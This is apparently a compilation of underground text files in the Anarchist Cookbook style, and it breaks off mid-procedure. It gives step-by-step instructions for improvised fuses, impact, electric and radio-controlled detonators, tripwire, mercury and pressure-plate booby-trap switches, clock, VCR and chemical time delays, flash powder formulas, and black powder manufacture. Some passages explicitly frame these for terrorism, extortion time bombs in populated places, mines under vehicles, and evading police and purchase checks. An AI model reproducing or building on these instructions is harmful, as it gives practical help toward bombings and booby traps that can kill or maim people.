Air drying will not do the job.  If you used Sodium Nitrate, it will not even
dry completely at room temperatures.

Cut the dry fuse with sissors into 2 inch lengths and store in an air tight
container.  Handle this fuse carefuly to avoid breaking it.  You can also use
a firecracker fuse if you have any available.  The fuses can usually be pulled
out without breaking.  To give yourself some running time, you will be
extending these fuses (blackmatch or firecracker fuse) with sulfured wick.

    Finally, it is possible to make a relatively slow-burning fuse in the
home. By dissolving about one teaspoon of black powder in about 1/4 a cup of
boiling water, and, while it is still hot, soaking in it a long piece of all
cotton string, a slow-burning fuse can be made. After the soaked string dries,
it must then be tied to the fuse of an explosive device. Sometimes, the end of
the slow burning fuse that meets the normal fuse has a charge of black powder
or gunpowder at the intersection point to insure ignition, since the
slow-burning fuse does not burn at a very high temperature.

 A similar type of slow fuse can be made by taking the above mixture of
boiling water and black powder and pouring it on a long piece of toilet paper.
The wet toilet paper is then gently twisted up so that it resembles a
firecracker fuse, and is allowed to dry.


                       HOW TO MAKE SULFURED WICK
                       -------------------------


   Use heavy cotton string about 1/8th inch in diameter.  You can find some at
a garden supply for tieing up your tomatoes.  Be sure it's cotton.  You can
test it by lighting one end.  It sould continue to burn after the match is
removed and when blown out will have a smoldering coal on the end.  Put some
sulfur in a small container like a small pie pan and melt it in the oven at
250 degrees.

    It will melt into a transparent yellow liquid.  If it starts turning
brown, it is too hot.  Coil about a one foot length of string into it.  The
melted sulfur will soak in quickly.  When saturated, pull it out and tie it up
to cool and harden.

  It can be cut to desired lengths with sissors.  2 inches is about right.
These wicks will burn slowly with a blue flame and do not blow out easily in a
moderate wind. They will not burn through a hole in a metal pipe, but are
great for extending your other fuse.  They will not throw off sparks.
Blackmatch generates sparks which can ignite it along its length causing
unpredictable burning times.


--IMPACT IGNITION

     Impact ignition is an excellent method of ignition for spontaneous
terrorist activities.  The problem with an impact-detonating device is that it
must be kept in a very safe container so that it will not explode while being
transported to the place where it is to be used.  This can be done by having a
removable impact initiator.

     The best and most reliable impact initiator is one that uses factory made
initiators or primers. A no. 11 cap for black powder firearms is one such
primer. They usually come in boxes of 100, and cost about $2.50. To use such a
cap, however, one needs a nipple that it will fit on. Black powder nipples are
also available in gun stores. All that a person has to do is ask for a package
of nipples and the caps that fit them.  Nipples have a hole that goes all the
way through them, and they have a threaded end, and an end to put the cap on.
A cutaway of a nipple is shown below:

                        |_________________|


     When making using this type of initiator, a hole must be drilled into
whatever container is used to make the bomb out of. The nipple is then screwed
into the hole so that it fits tightly. Then, the cap can be carried and placed
on the bomb when it is to be thrown. The cap should be bent a small amount
before it is placed on the nipple, to make sure that it stays in place.  The
only other problem involved with an impact detonating bomb is that it must
strike a hard surface on the nipple to set it off. By attaching fins or a
small parachute on the end of the bomb opposite the primer, the bomb, when
thrown, should strike the ground on the primer, and explode. Of course, a bomb
with mercury fulminate in each end will go off on impact regardless of which
end it strikes on, but mercury fulminate is also likely to go off if the
person carrying the bomb is bumped hard.


---MAGICUBE IGNITOR

      A VERY SENSITIVE and reliable impact iniator can be  produced from the
common MAGICUBE ($2.40 for 12) type flashbulbs. Simply crack the plastic
cover off, remove the reflector, and you will see 4 bulbs, each of which has
a small metal rod holding it in place.

     CAREFULLY grasp this rod with a pair of needle-nose pliers, and pry gently
upwards, making sure that NO FORCE IS APPLIED TO THE GLASS BULB.

     Each bulb is coated with plastic, which must be removed for them to be
effective in our application. This coating can be removed by soaking the
bulbs in a small glass of acetone for 30-45 minutes, at which point the
plastic can be easily peeled away.

     The best method to use these is to dissolve some nitrocellulose based
smokeless powder in acetone and/or ether, forming a thich glue-like paste.
Coat the end of the fuse with this paste, then stick the bulb (with the metal
rod facing out) into the paste. About half the bulb should be completely
covered, and if a VERY THIN layer of nitrocellulose is coated over the
remainder then ignition should be very reliable.

     To insure that the device lands with the bulb down, a small streamer
can be attached to the opposite side, so when it is tossed high into the air
the appropriate end will hit the ground first.


---ELECTRICAL IGNITION

     Electrical ignition systems for detonation are usually the safest and
most reliable form of ignition. Electrical systems are ideal for demolition
work, if one doesn't have to worry so much about being caught. With two spools
of 500 ft of wire and a car battery, one can detonate explosives from a
"safe", comfortable distance, and be sure that there is nobody around that
could get hurt. With an electrical system, one can control exactly what time a
device will explode, within fractions of a second. Detonation can be aborted
in  less than a second's warning, if a person suddenly walks by the detonation
sight, or if a police car chooses to roll by at the time. The two best
electrical igniters are military squibs and model rocketry igniters. Blasting
caps for construction also work well. Model rocketry igniters are sold in
packages of six, and cost about $1.00 per pack. All that need be done to use
them is connect it to two wires and run a current through them. Military
squibs are difficult to get, but they are a little bit better, since they
explode when a current is run through them, whereas rocketry igniters only
burst into flame. Most squibs will NOT detonate KClO3/petroleum jelly or RDX.
This requires a blasting cap type detonation in most cases.  There are,
however, military explosive squibs which will do the job.

Igniters can be used to set off black powder, mercury fulminate, or guncotton,
which in turn, can set of a high order explosive.


---HOW TO MAKE AN ELECTRIC FUZE    (By Capt. Hack & GW)

   Take a flashlight bulb and place it glass tip down on a file.  Grind it
down on the file until there is a hole in the end. Solder one wire to the case
of the bulb and another to the center conductor at the end.  Fill the bulb
with black powder or powdered match head. One or two flashlight batteries will
heat the filament in the bulb causing the powder to ignite.


---ANOTHER ELECTRIC FUZE

    Take a medium grade of steel wool and pull a strand out of it.  Attach it
to the ends of two pieces of copper wire by wrapping it around a few turns and
then pinch on a small piece of solder to bind the strand to the wire. You want
about 1/2 inch of steel strand between the wires.  Number 18 or 20 is a good
size wire to use.
     Cut a 1/2 by 1 inch piece of cardboard of the type used in match covers.
Place a small pile of powdered match head in the center and press it flat.
place the wires so the steel strand is on top of and in contact with the
powder. Sprinkle on more powder to cover the strand.
     The strand should be surounded with powder and not touching anything else
except the wires at its ends. Place a piece of blackmatch in contact with the
powder.  Now put a piece of masking tape on top of the lot, and fold it under
on the two ends.  Press it down so it sticks all around the powder.
      The wires are sticking out on one side and the blackmatch on the other.
A single flashlight battery will set this off.

---ELECTRO-MECHANICAL IGNITION

     Electro-mechanical ignition systems are systems that use some type of
mechanical switch to set off an explosive charge electrically.  This type of
switch is typically used in booby traps or other devices in which the person
who places the bomb does not wish to be anywhere near the device when it
explodes. Several types of electro-mechanical detonators will be discussed

---Mercury Switches

     Mercury switches are a switch that uses the fact that mercury metal
conducts electricity, as do all metals, but mercury metal is a liquid at room
temperatures. A typical mercury switch is a sealed glass tube with two
electrodes and a bead of mercury metal. It is sealed because of mercury's
nasty habit of giving off brain-damaging vapors. The diagram below may help to
explain a mercury switch.


                         ______________
                     A  /              \   B
      _____wire +______/_________       \
                       \   ( Hg   )|    /
                        \ _(_Hg___)|___/
                                   |
                                   |
                            wire - |
                                   |
                                   |

     When the drop of mercury ("Hg" is mercury's atomic symbol) touches both
contacts, current flows through the switch.  If this particular switch was in
its present position, A---B, current would be flowing, since the mercury can
touch both contacts in the horizontal position.

     If, however, it was in the | position, the drop of mercury would only
touch the + contact on the A side. Current, then couldn't flow, since mercury
does not reach both contacts when the switch is in the vertical position. This
type of switch is ideal to place by a door. If it were placed in the path of a
swinging door in the verticle position, the motion of the door would knock the
switch down, if it was held to the ground by a piece if tape. This would tilt
the switch into the verticle position, causing the mercury to touch both
contacts, allowing current to flow through the mercury, and to the igniter or
squib in an explosive device.


---Tripwire Switches

     A tripwire is an element of the classic booby trap.  By placing a nearly
invisible line of string or fishing line in the probable path of a victim, and
by putting some type of trap there also, nasty things can be caused to occur.
If this mode of thought is applied to explosives, how would one use such a
tripwire to detonate a bomb.  The technique is simple.  By wrapping the tips
of a standard clothespin with aluminum foil, and placing something between
them, and connecting wires to each aluminum foil contact, an electric tripwire
can be made,  If a piece of wood attached to the tripwire was placed between
the contacts on the clothespin, the clothespin would serve as a switch.  When
the tripwire was pulled, the clothespin would snap together, allowing current
to flow between the two pieces of aluminum foil, thereby completing a circuit,
which would have the igniter or squib in it.  Current would flow between the
contacts to the igniter or squib, heat the igniter or squib, causing it it to
explode. Make sure that the aluminum foil contacts do not touch the spring,
since the spring also conducts electricity.


---Radio Control Detonators

     In the movies, every terrorist or criminal uses a radio controlled
detonator to set off explosives.  With a good radio detonator, one can be
several miles away from the device, and still control exactly when it
explodes, in much the same way as an electrical switch.  The problem with
radio detonators is that they are rather costly.  However, there could
possibly be a reason that a terrorist would wish to spend the amounts of money
involved with a RC (radio control) system and use it as a detonator.  If such
an individual wanted to devise an RC detonator, all he would need to do is
visit the local hobby store or toy store, and buy a radio controlled toy.
Taking it back to his/her abode, all that he/she would have to do is detach
the solenoid/motor that controls the motion of the front wheels of a RC car,
or detach the solenoid/motor of the elevators/rudder of a RC plane, or the
rudder of a RC boat, and re-connect the squib or rocket engine igniter to the
contacts for the solenoid/motor.  The device should be tested several times
with squibs or igniters, and fully charged batteries should be in both he
controller and the receiver (the part that used to move parts before the
device became a detonator).

---DELAYS

     A delay is a device which causes time to pass from when a device is set
up to the time that it explodes.  A regular fuse is a delay, but it would cost
quite a bit to have a 24 hour delay with a fuse.  This section deals with the
different types of delays that can be employed by a terrorist who wishes to be
sure that his bomb will go off, but wants to be out of the country when it
does.


---FUSE DELAYS

     It is extremely simple to delay explosive devices that employ fuses for
ignition.  Perhaps the simplest way to do so is with a cigarette.  An average
cigarette burns for between 8-11 minutes. The higher the "tar" and nicotine
rating, the slower the cigarette burns. Low "tar" and nicotine cigarettes burn
quicker than the higher "tar" and nicotine cigarettes, but they are also less
likely to go out if left unattended, i.e. not smoked. Depending on the wind or
draft in a given place, a high "tar" cigarette is better for delaying the
ignition of a fuse, but there must be enough wind or draft to give the
cigarette enough oxygen to burn. People who use cigarettes for the purpose of
delaying fuses will often test the cigarettes that they plan to use in advance
to make sure they stay lit and to see how long it will burn. Once a cigarettes
burn rate is determined, it is a simple matter of carefully putting a hole all
the way through a cigarette with a toothpick at the point desired, and pushing
the fuse for a device in the hole formed.

---TIMER DELAYS

     Timer delays, or "time bombs" are usually employed by an individual who
wishes to threaten a place with a bomb and demand money to reveal its location
and means to disarm it.  Such a device could be placed in any populated place if
it were concealed properly.  There are several ways to build a timer delay. By
simply using a screw as one contact at the time that detonation is desired, and
using the hour hand of a clock as the other contact, a simple timer can be made.
The minute hand of a clock should be removed, unless a delay of less than an
hour is desired.

     The main disadvantage with this type of timer is that it can only be set
for a maximum time of 12 hours.  If an electronic timer is used, such as that
in an electronic clock, then delays of up to 24 hours are possible.  By
removing the speaker from an electronic clock, and attaching the wires of a
squib or igniter to them, a timer with a delay of up to 24 hours can be made.
All that one has to do is set the alarm time of the clock to the desired time,
connect the leads, and go away.  This could also be done with an electronic
watch, if a larger battery were used, and the current to the speaker of the
watch was stepped up via a transformer.  This would be good, since such a
timer could be extremely small.

 The timer in a VCR (Video Cassette Recorder) would be ideal.  VCR's can
usually be set for times of up to a week.  The leads from the timer to the
recording equipment would be the ones that an igniter or squib would be
connected to.  Also, one can buy timers from electronics stores that would be
work well.  Finally, one could employ a digital watch, and use a relay, or
electro-magnetic switch to fire the igniter, and the current of the watch
would not have to be stepped up.


---CHEMICAL DELAYS

     Chemical delays are uncommon, but they can be extremely effective in some
cases. These were often used in the bombs the Germans dropped on England. The
delay would ensure that a bomb would detonate hours or even days after the
initial bombing raid, thereby increasing the terrifying effect on the British
citizenry.

  If a glass container is filled with concentrated sulfuric acid, and capped
with several thicknesses of aluminum foil, or a cap that it will eat through,
then it can be used as a delay.  Sulfuric acid will react with aluminum foil
to produce aluminum sulfate and hydrogen gas, and so the container must be
open to the air on one end so that the pressure of the hydrogen gas that is
forming does not break the container.

     The aluminum foil is placed over the bottom of the container and secured
there with tape.  When the acid eats through the aluminum foil, it can be used
to ignite an explosive device in several ways.

1) Sulfuric acid is a good conductor of electricity.  If the acid that eats
   through the foil is collected in a glass container placed underneath the
   foil, and two wires are placed in the glass container, a current will be
   able to flow through the acid when both of the wires are immersed in the
   acid.

2) Sulfuric acid reacts very violently with potassium chlorate. If the acid
   drips down into a container containing potassium chlorate, the potassium
   chlorate will burst into flame.  This flame can be used to ignite a fuse,
   or the potassium chlorate can be the igniter for a thermite bomb, if some
   potassium chlorate is mixed in a 50/50 ratio with the thermite, and this
   mixture is used as an igniter for the rest of the thermite.

3) Sulfuric acid reacts with potassium permangenate in a similar way.

Fuses                             by The Jolly Roger

You would be surprised how many files are out there that use what 
falls under the category of a "fuse." They assume that you just 
have a few lying around, or know where to get them. Well, in some 
parts of the country, fuses are extremely hard to come by... so 
this file tells you how to make your own. Both fuses presented 
here are fairly simple to make, and are fairly reliable.

SLOW BURNING FUSE
~~~~~~~~~~~~~~~~~ (approx. 2 inches per minute)

Materials needed:

 - Cotton string or 3 shoelaces
 - Potassium Nitrate or Potassium Chlorate
 - Granulated sugar

Procedure:

 - Wash the cotton string or showlaces in HOT soapy water, then 
rinse with fresh water

 - Mix the following together in a glass bowl:
   1 part potassium nitrate or potassium chlorate
   1 part granulated sugar
   2 parts hot water

 - Soak strings or shoelaces in this solution

 - Twist/braid 3 strands together and allow them to dry
 
 - Check the burn rate to see how long it actually takes!!

FAST BURNING FUSE
~~~~~~~~~~~~~~~~~ (40 inches per minute)

Materials needed:

 -Soft cotton string
 -fine black powder (empty a few shotgun shells!)
 -shallow dish or pan

Procedure:

 - moisten powder to form a paste

 - twist/braid 3 strands of cotton together

 - rub paste into string and allow to dry

 - Check the burn rate!!!

Materials needed:

 -Pack of 10 silicon diodes (available at Radio Shack. you will 
  know you got the right ones if they are very, very small glass 
  objects!)
 -Pack of matches
 -1 candle

Procedure:

 - Light the candle and allow a pool of molten wax to form in the 
top.

 - Take a single match and hold the glass part of a single diode 
against the head. Bend the diode pins around the matchhead so that 
one wraps in an upward direction and thensticks out to the side. 
Do the same with the other wire, but in a downward direction. The 
diodes should now be hugging the matchhead, but its wires MUST NOT 
TOUCH EACH OTHER!

 - Dip the matchhead in wax to give it a water-proof coat. These 
work underwater

 - repeat to make as many as you want

How to use them:

When these little dudes are hooked across a 6v battery, the diode 
reaches what is called breakdown voltage. When most electrical 
components reach this voltage, they usually produce great amounts 
of heat and light, while quickly melting into a little blob. This 
heat is enough to ignite a matchhead. These are recommended for 
use underwater, where most other igniters refuse to work. ENJOY!

      Igniter from Book Matches                     by the Jolly Roger

          This  is  a  hot  igniter made from paper book matches for use
      with molotov cocktail and other incendiaries.

      Material Required:
      -----------------

      Paper book matches
      Adhesive or friction tape

      Procedure:
      ---------

      1) Remove the staple(s) from match book and seperate matches  from
      cover.

      2) Fold and tape one row of matches (fold in thirds)

      3) Shape the cover into a tube with striking surface on the inside
      and  tape.  Make sure the folder cover will fit tightly around the
      taped match heads. Leave cover open at opposite end for  insertion
      of the matches.

      4)  Push the taped matches into the tube until the bottom ends are
      exposed about 3/4 in. (2 cm)

      5) Flatten and fold the open end of the tube so that it laps  over
      about 1 in. (2-1/2 cm); tape in place.

      Use with a Molotov Cocktail:
      ---------------------------

      1)  Tape  the  "match  end  tab" of the igniter to the neck of the
      molotov cocktail.

      2) Grasp the "cover and  tab"  and  pull  sharply  or  quickly  to
      ignite.

      General Use:
      -----------

      The  book  match igniter can be used by itself to ignite flammable
      liquids, fuse cords, and similar items requiring hot ignition.

      CAUTION: Store matches and  completed  igniters  in  moistureproof
      containers  such  as  rubber  or plastic bags until ready for use.
      Damp or wet paper book matches will not ignite.

     A variation on the standard cigarette display was invented by my good
friend Atur (THE Pyromaniac). Rather than inserting the fuse into the SIDE
of the cigarette (and risk splitting it) half of the filter is cut off, and a
small hole is punched THROUGH the remainder of the filter and into the
tobacco.

     The fuse is inserted as far as possible into this hole, then taped or
glued in place, or the cigarette can be cut and punched ahead of time and
lit normally, then attached to the fuse at the scene.

     A similar type of device can be make from powdered charcoal and a sheet
of paper.  Simply roll the sheet of paper into a thin tube, and fill it with
powdered charcoal. Punch a hole in it at the desired location, and insert a
fuse. Both ends must be glued closed, and one end of the delay must be doused
with lighter fluid before it is lit. Or, a small charge of gunpowder mixed
with powdered charcoal could conceivably used for igniting such a delay. A
chain of charcoal briquettes can be used as a delay by merely lining up a few
bricks of charcoal so that they touch each other, end on end, and lighting the
first brick. Incense, which can be purchased at almost any novelty or party
supply store, can also be used as a fairly reliable delay. By wrapping the
fuse about the end of an incense stick, delays of up to 1/2 an hour are
possible.

     This flexible plate switch is used for initiating emplaced mines and 
explosives.

Material Required:
-----------------

Two flexible metal sheets
  one approximately 10 in. (25 cm) square
  one approximately 10 in. x 8 in. (20 cm)
Piece of wood 10 in. square x 1 in. thick
Four soft wood blocks 1 in. x 1 in. x 1/4 in.
Eight flat head nails, 1 in. long
Connecting wires
Adhesive tape

Procedure:
---------

1) Nail 10 in. by 8 in. metal sheet to 10 in. square piece of wood so that 
1 in. of wood shows on each side of the metal. Leave one of the nails 
sticking up about 1/4 in.
2) Strip insulation from the end of one connecting wire. Wrap this end 
around the nail and drive the nail all the way in.
3) Place the four wood blocks on the corners of the wood base.
4) Place the 10 in. square flexible metal sheet so that it rests on the 
blocks in line with the wood base.
5) Drive four nails through the metal sheet and the blocks (1 per block) 
to fasten the sheet to the wood base. A second connecting wire is atached 
to one of the nails as in step #2.
6) Wrap the adhesive tape around the edges of the plate and wood base. 
This will assure that no dirt or other foreign matter will get between the 
plates and prevent the switch from operating.

How to use:
----------

The switch is placed in a hole in the path of expected traffic and covered 
with a thin layer of dirt or other camouflaging material. The mine or 
other explosive device connected to the switch can be buried with the 
switch or emplaced elsewhere as desired.

When a vehicle passes over the switch, the two metal plates make contact 
closing the firing circuit.

  Drip Timer


Another method of time delay for explosives that are detonated by 
electric means, is the drip timer.  Fill a 'baggie' with water and 
then add as much salt as the water will hold.  Seal it, leaving some 
air inside.  Then, tape the two contact wires from which the circuit 
has been broken, to the inside of a large cup. Place the baggie on 
the cup.  Poke a hole in the top of the 'baggie', where there is 
air, and then make a hole in the bottom to let the water drain into 
the cup.  As any Einstien figures, the salt water level in the cup 
will eventually cunduct electricity at the moment both wires touch 
water, thus completing the circut.  I have yet to try this timer 
out, and I got the plans from a total idiot, phreaker nonetheless, 
and doubt it would work with any power source under 12v.

Dried Seed Timer                                    by the Jolly Roger

     A time delay device for electrical firing circuits can be made using 
the principle of expansion of dried seeds.

Material Required:
-----------------

Dried peas, beans, or oter dehydrated seeds
Wide-mouth glass jar with non-metal cap
Two screws or bolts
Thin metal plate
Hand drill
Screwdriver

Procedure:
---------
1) Determine the rate of the rise of the dried seeds selected. This is 
necessary to determine the delay time of the timer.
     a) Place a sample of the dried seeds in the jar and cover with 
        water.
     b) Measure the time it takes for the seeds to rise a given height. 
        Most dried seeds increase 50% in one to two hours.
2) Cut a disc from thin metal plate. Disc should fit loosely inside the 
jar.

NOTE: If metal is painted, rusty, or otherwise coated, it must be scraped 
or sanded to obtain a clean metal surface

3) Drill two holes in the cap of the jar about 2 inches apart. Diameter 
of holes should be such that screws or bolts will thread tightly into 
them. If the jar has a metal cap or no cap, a piece of wood or plastic 
(NOT METAL) can be used as a cover.
4) Turn the two screws or bolts through the holes in the cap. Bolts 
should extend about one in. (2 1/2 cm) into the jar.

IMPORTANT: Both bolts must extend the same distance below the container 
cover.

5) Pour dried seeds into the container. The level will depend upon the 
previously measured rise time and the desired delay.
6) Place the metal disc in the jar on top of the seeds.

How to use:
----------

1) Add just enough water to completely cover the seeds and place the cap 
on the jar.
2) Attach connecting wires from the firing circuit to the two screws on 
the cap.

Expansion of the seeds will raise the metal disc until it contacts the 
screws and closes the circuit.

================================================================================

NOTE: Mixtures that uses substitutions of sodium perchlorate for potassium      
perchlorate become moisture-absorbent and less stable.

     The higher the speed number, the faster the fuel-oxodizer mixture burns
AFTER ignition.  Also, as a rule, the finer the powder, the faster the rate of
burning.

     As one can easily see, there is a wide variety of fuel-oxodizer mixtures
that can be made at home.  By altering the amounts of fuel and oxodizer(s),
different burn rates can be achieved, but this also can change the sensitivity
of the mixture.

      "Red or White Powder" Propellant            by the Jolly Roger

          "Red or White Powder" Propellant may be prepared in a  simple,
      safe  manner.  The  formulation  described  below  will  result in
      approximately 2 1/2  pounds  of  powder.  This  is  a  small  arms
      propellant  and  should  only  be  used  in  weapons  with 1/2 in.
      diameter or less (but not pistols!).

      Material Required:
      -----------------

      Heat Source (Kitchen Stove or open fire)
      2 gallon metal bucket
      Measuring cup (8 ounces)
      Wooden spoon or rubber spatula
      Metal sheet or aluminum foil (at least 18 in. sq.)
      Flat window screen (at least 1 foot square)
      Potassium Nitrate (granulated) 2-1/3 cups
      White sugar (granulated) 2 cups
      Powdered ferric oxide (rust) 1/8 cup (if available)
      Clear water, 1-1/2 cups

      Procedure:
      ---------

      1) Place the sugar, potassium nitrate, and water  in  the  bucket.
      Heat  with  a low flame, stirring occasionally until the sugar and
      potassium nitrate dissolve.

      2) If available, add the ferric  oxide  (rust)  to  the  solution.
      Increase the flame under the mixture until it boils gently.

      NOTE: The mixture will retain the rust coloration.

      3) Stir and scrape the bucket sides occasionally until the mixture
      is  reduced  to  one  quarter  of  its  original volume, then stir
      continuously.

      4) As the water evaporates, the mixture will become thicker  until
      it  reaches the consistency of cooked breakfast cereal or homemade
      fudge. At this stage of thickness, remove the bucket from the heat
      source, and spread the mass on the metal sheet.

      5) While the material cools, score it with a spoon or  spatula  in
      crisscrossed furrows about 1 inch apart.

      6)  Allow the material to dry, preferably in the sun. As it dries,
      resore it accordingly (about every 20 minutes) to aid drying.

      7) When the material has dried to a point  where  it  is moist and
      soft  but  not  sticky to the touch, place a small spoonful on the
      screen. Rub the material back and forth against  the  screen  mesh
      with  spoon  or other flat object until the material is granulated
      into small worm-like particles.

      8) After granulation, return the material to the sun to  allow  to
      dry completely.

                    BUYING EXPLOSIVES AND PROPELLANTS

     Almost any city or town of reasonable size has a gun store and one or
more pharmacies. These are two of the places that potential terrorists visit
in order to purchase explosive material.  All that one has to do is know
something about the non- explosive uses of the materials.  Black powder, for
example, is used in blackpowder firearms.  It comes in varying "grades", with
each different grade being a slightly different size.  The grade of black
powder depends on what the calibre of the gun that it is used in; a fine grade
of powder could burn too fast in the wrong caliber weapon.  The rule is: the
smaller the grade, the faster the burn rate of the powder.


                             BLACK POWDER

     Black powder is generally available in three grades.  As stated before, the
smaller the grade, the faster the powder burns.  Burn rate is extremely
important in bombs.  Since an explosion is a rapid increase of gas volume in a
confined environment, to make an explosion, a quick-burning powder is desirable.
The three common grades of black powder are listed below, along with the usual
bore width (calibre) of what they are used in.  Generally, the fastest burning
powder, the FFF grade is desirable.  However, the other grades and uses are
listed below:

     GRADE              BORE WIDTH               EXAMPLE OF GUN
                                  
     F                  .50 or greater           model cannon; some rifles
     FF                 .36 - .50                large pistols; small rifles
     FFF                .36 or smaller           pistols; derringers

     The FFF grade is the fastest burning, because the smaller grade has more
surface area or burning surface exposed to the flame front.  The larger grades
also have uses which will be discussed later.  The price range of black
powder, per pound, is about $8.50 - $9.00.  The price is not affected by the
grade, and so one saves oneself time and work if one buys the finer grade of
powder.  The major problems with black powder are that it can be ignited
accidentally by static electricity, and that it has a tendency to absorb
moisture from the air. To safely crush it, a one would use a plastic spoon and
a wooden salad bowl. Taking a small pile at a time, he or she would apply
pressure to the powder through the spoon and rub it in a series of strokes or
circles, but not too hard.  It is fine enough to use when it is about as fine
as flour.  The fineness, however, is dependant on what type of device one
wishes to make; obviously, it would be impracticle to crush enough powder to
fill a 1 foot by 4 inch radius pipe.  Any adult can purchase black powder,
since anyone can own black powder firearms in the United States.


                                PYRODEX

     Pyrodex is a synthetic powder that is used like black powder.  It comes
in the same grades, but it is more expensive per pound.  However, a one pound
container of pyrodex contains more material by volume than a pound of black
powder.  It is much easier to crush to a very fine powder than black powder,
and it is considerably safer and more reliable.  This is because it will not
be set off by static electricity, as black can be, and it is less inclined to
absorb moisture.  It costs about $10.00 per pound.  It can be crushed in the
same manner as black powder, or it can be dissolved in boiling water and
dried.


                        ROCKET ENGINE POWDER

     One of the most exciting hobbies nowadays is model rocketry.  Estes is
the largest producer of model rocket kits and engines.  Rocket engines are
composed of a single large grain of propellant.  This grain is surrounded by a
fairly heavy cardboard tubing.  One gets the propellant by slitting the tube
length- wise, and unwrapping it like a paper towel roll.  When this is done,
the gray fire clay at either end of the propellant grain must be removed.
This is usually done gently with a plastic or brass knife. The material is
exceptionally hard, and must be crushed to be used.  By gripping the grain in
the widest setting on a set of pliers, and putting the grain and powder in a
plastic bag, the powder will not break apart and shatter all over.  This
should be done to all the large chunks of powder, and then it should be
crushed like black powder. Rocket engines come in various sizes, ranging from
1/4 A - 2T to the incredibly powerful D engines.  The larger the engine, the
more expensive.  D engines come in packages of three, and cost about $5.00 per
package.  Rocket engines are perhaps the single most useful item sold in
stores to a terrorist, since they can be used as is, or can be cannibalized
for their explosive powder.

                       
                        RIFLE/SHOTGUN POWDER

     Rifle powder and shotgun powder are really the same from a practicle
standpoint. They are both nitrocellulose based propellants. They will be
referred to as gunpowder in all future references. Smokeless gunpowder is made
by the action of concentrated nitric and sulfuric acid upon cotton or some
other cellulose material. This material is then dissolved by solvents and then
reformed in the desired grain size.  When dealing with smokeless gunpowder,
the grain size is not nearly as important as that of black powder. Both large
and small grained smokeless powder burn fairly slowly compared to black powder
when unconfined, but when it is confined, gunpowder burns both hotter and with
more gaseous expansion, producing more pressure. Therefore, the grinding
process that is often necessary for other propellants is not necessary for
smokeless powder. owder costs about $9.00 per pound. In most states any
citizen with a valid driver's license can buy it, since there are currently
few restrictions on rifles or shotguns in the U.S. There are now ID checks in
many states when purchasing powder at a retail outlet.  Mail-orders aren't
subject to such checks.  Rifle powder and pyrodex may be purchased by mail
order, but UPS charges will be high, due to DOT regulations on packaging.

FLASH POWDER      (By Dr. Tiel)

Here are a few basic precautions to take if you're crazy enough to produce
your own flash powder:

(1) Grind the oxidizer (KNO3, KClO3, KMnO4, KClO4 etc) separately in a
     clean vessel.

(2) NEVER grind or sift the mixed composition.

(3) Mix the composition on a large paper sheet, by rolling the composition
    back and forth.

(4) Do not store flash compositions, especially any containing Mg.

(5) Make very small quantities at first, so you can appreciate the power
    of such mixtures.

        KNO3  50%     (by weight)
        Mg    50%

   It is very important to have the KNO3 very dry, if evolution of ammonia is
observed then the KNO3 has water in it.  Very pure and dry KNO3 is needed.

   KClO3 with Mg or Al metal powders works very well.  Many hands, faces and
lives have been lost with such compositions.

KMnO4 with Mg or Al is also an extremely powerful flash composition.

KClO4 with Al is generally found in comercial fireworks, this does not
mean that it is safe, it is a little safer than KClO3 above.

K2Cr2O7 can also be used as an oxidizer for flash powder.

The finer the oxidizer and the finer the metal powder the more powerful the
explosive.  This of course will also increase the sensetivity of the flash
powder.

For a quick flash small quantities can be burnt in the open.
Larger quantities (50g or more)  ignited in the open can detonate, they do not
need a container to do so.

NOTE:   Flash powder in any container will detonate.

Balanced equations of some oxidizer/metal reactions. Only major products
are considered.  Excess metal powders are generally used.  This excess
burns with atmospheric oxygen.

4 KNO3 + 10 Mg  -->  2 K2O + 2 N2 + 10 MgO + energy

KClO3 + 2 Al  -->  KCl + Al2O3 + energy

3 KClO4 + 8 Al  -->  3 KCl + 4 Al2O3 + energy

6 KMnO4 + 14 Al  -->  3 K2O + 7 Al2O3 + 6 Mn + energy

Make Black Powder first if you have never worked with pyrotechnic 
materials, then think about this stuff.

Improvised Black Powder                             by the Jolly Roger

     Black powder can be prepared in a simple, safe manner. It may be used as 
blasting or gun powder.

Material Required
-----------------

Potassium Nitrate, granulated, 3 cups (3/4 liter)
Wood charcoal, powdered, 2 cups
Sulfur, powdered, 1/2 cup
Alcohol, 5 pints (2-1/2 liters) (whiskey, rubbing alcohol, etc.)
Water, 3 cups (3/4 liter)
Heat source
2 buckets - each 2 gallon (7-1/2 litres) capacity, at least one of which is 
     heat resistant (metal, ceramic, etc.)
Flat window screening, at least 1 foot (30 cm) square
Large wooden stick
Cloth, at leat 2 feet (60 cm) square

Procedure:
---------

1) Place alcohol in one of the buckets.
2) Place potassium nitrate, charcoal, and sulfur in the heat resistant 
bucket. Add 1 cup water and mix thoroughly with wooden stick until all 
ingrediants are dissolved.
3) Add remaining water (2 cups) to mixture. Place bucket on heat source and 
stir until small bubbles begin to form.

CAUTION: DO NOT boil mixture. Be sure ALL mixture stays wet. If any is dry, 
as on sides of pan, it may ignite!

4) Remove bucket from heat and pour mixture into alcohol while stirring 
vigorously.
5) Let alcohol mixture stand about 5 minutes. Strain mixture through cloth to 
obtain black powder. Discard liquid. Wrap cloth around black powder and 
squeeze to remove all excess liquid.
6) Place screening over dry bucket. Place workable amount of damp powder on 
screen and granulate by rubbing solid through screen. NOTE: If granulated 
particles appear to stick together and change shape, recombine entire batch 
of powder and repeat steps 5 & 6.
7) Spread granulated black powder on flat, dry surface so that layer about 
1/2 inch (1-1/4 cm) is formed. Allow to dry. Use radiator, or direct 
sunlight. This should be dried as soon as possible, preferably in an hour. 
The longer the drying period, the less effective the black powder.

CAUTION: Remove from heat AS SOON AS granules are dry. Black powder isnow 
ready to use.


                                        -= RFLAGG =-    BLACK POWDER 3

     First made by the Chinese for use in fireworks, black powder was first
used in weapons and explosives in the 12th century.  It is very simple to
make, but it is not very powerful or safe.  Only about 50% of black powder is
converted to hot gasses when it is burned; the other half is mostly very fine
burned particles.  Black powder has one major problem: it can be ignited by
static electricity.  This is very bad, and it means that the material must be
made with wooden or clay tools.  Anyway, a misguided individual could
manufacture black powder at home with the following procedure:

     MATERIALS               EQUIPMENT
                    
     potassium               clay grinding bowl
     nitrate (75 g)          and clay grinder

       or                         or

     sodium                  wooden salad bowl
     nitrate (75 g)          and wooden spoon

     sulfur (10 g)           plastic bags (3)

     charcoal (15 g)         300-500 ml beaker (1)

     distilled water         coffee pot or heat source



1) Place a small amount of the potassium or sodium nitrate in the grinding
 bowl and grind it to a very fine powder.  Do this to all of the potassium or
 sodium nitrate, and store the ground powder in one of the plastic bags.

2) Do the same thing to the sulfur and charcoal, storing each chemical in a
